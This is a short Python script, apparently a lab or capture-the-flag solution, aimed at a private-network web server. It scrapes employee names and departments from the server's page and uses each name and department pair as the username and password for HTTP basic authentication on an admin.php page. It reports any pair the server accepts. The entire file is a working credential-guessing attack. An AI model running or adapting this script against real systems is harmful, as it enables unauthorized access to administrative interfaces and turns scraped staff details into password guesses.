import requests
from bs4 import BeautifulSoup

def downloader(url):
    r = requests.get(url)
    response = r.content
    return response

def find_names(response):
    parser = BeautifulSoup(response, 'html.parser')
    names = parser.find_all('td', id='name')
    output = []
    for name in names:
        output.append(name.text)
    return output

def find_deps(response):
    parser = BeautifulSoup(response, 'html.parser')
    departments = parser.find_all('td', id="department")
    outputD = []
    for dep in departments:
        outputD.append(dep.text)
    return outputD

def req_admin(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print(f"\nusername: {username}, password: {password}, {r.status_code} \n")


def main():
    page = downloader('http://172.16.120.120')
    names = find_names(page)
    uniqnames = sorted(set(names))

    deps = find_deps(page)
    uniqdeps = sorted(set(deps))

    print("[*]Working...")
    for name in uniqnames:
        for dep in uniqdeps:
            req_admin('http://172.16.120.120/admin.php',name,dep)